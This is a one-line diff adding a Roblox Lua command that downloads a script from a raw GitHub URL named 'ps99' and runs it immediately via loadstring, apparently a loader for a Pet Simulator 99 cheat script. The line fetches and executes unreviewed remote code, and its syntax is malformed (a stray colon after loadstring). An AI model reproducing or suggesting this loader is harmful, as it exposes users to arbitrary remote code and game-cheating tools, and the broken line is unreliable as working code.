@@ -1,0 +1,1 @@
+loadstring:(game:HttpGet("https://raw.githubusercontent.com/TXDeath/ps99/refs/heads/main/ps99"))()
